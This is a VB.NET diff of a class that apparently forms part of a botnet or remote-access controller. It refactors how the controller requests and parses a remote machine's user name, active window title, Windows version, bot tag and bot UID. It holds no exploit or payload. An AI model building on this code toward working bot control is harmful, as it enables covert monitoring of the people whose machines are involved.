@@ -8,6 +8,8 @@ Public Class clsInfo
     Private Const INFO_BASIC As Byte = 0
     Private Const INFO_CURRENT_WINDOW As Byte = 1
     Private Const INFO_WINDOW_VERSION As Byte = 2
+    Private Const INFO_BOTTAG As Byte = 3
+    Private Const INFO_BOTUID As Byte = 4
 
     Public Sub New(ByVal mConnPool As clsConnection)
         Conn = mConnPool
@@ -29,7 +31,8 @@ Public Class clsInfo
         SendGetWindowBasicInfo()
         SendGetWindowVersion()
         SendGetWindowTitle()
-        SendGetBotID()
+        SendGetBotTag()
+        SendGetBotUID()
 
     End Sub
 
@@ -43,11 +46,11 @@ Public Class clsInfo
 
 
         Select Case ID
-            Case 0 'Basic Information
+            Case INFO_BASIC 'Basic Information
                 ClientInfo.computerUserName = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
-            Case 1 ' Widow tittle
+            Case INFO_CURRENT_WINDOW ' Widow tittle
                 ClientInfo.WindowTitle = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
-            Case 2 ' Window version. Would be a lot of if/else
+            Case INFO_WINDOW_VERSION ' Window version. Would be a lot of if/else
                 Dim dwMajorVersion As Integer = packet(1)
                 Dim dwMinorVersion As Integer = packet(2)
                 If dwMajorVersion = 10 And dwMinorVersion = 0 Then
@@ -69,8 +72,10 @@ Public Class clsInfo
                 Else
                     ClientInfo.windowVersion = "Unknown windows version"
                 End If
-            Case 3 ' Bot ID
-                ClientInfo.botID = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
+            Case INFO_BOTTAG ' Bot Tag
+                ClientInfo.botTag = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 1, packet.Length - 1))
+            Case INFO_BOTUID
+                ClientInfo.botID = Hex(BinReader.BufferReadDWORD(packet, 1))
         End Select
     End Sub
 
@@ -117,7 +122,7 @@ Public Class clsInfo
         Return True
     End Function
 
-    Public Function SendGetBotID() As Boolean
+    Public Function SendGetBotTag() As Boolean
         Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
         Dim packet As Byte() = {}
 
@@ -127,4 +132,11 @@ Public Class clsInfo
         Return True
     End Function
 
+    Public Function SendGetBotUID() As UInteger
+        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim packet As Byte() = {}
+
+        BinWritter.BufferAddByte(packet, 4)
+        SendPacket(packet)
+    End Function
 End Class
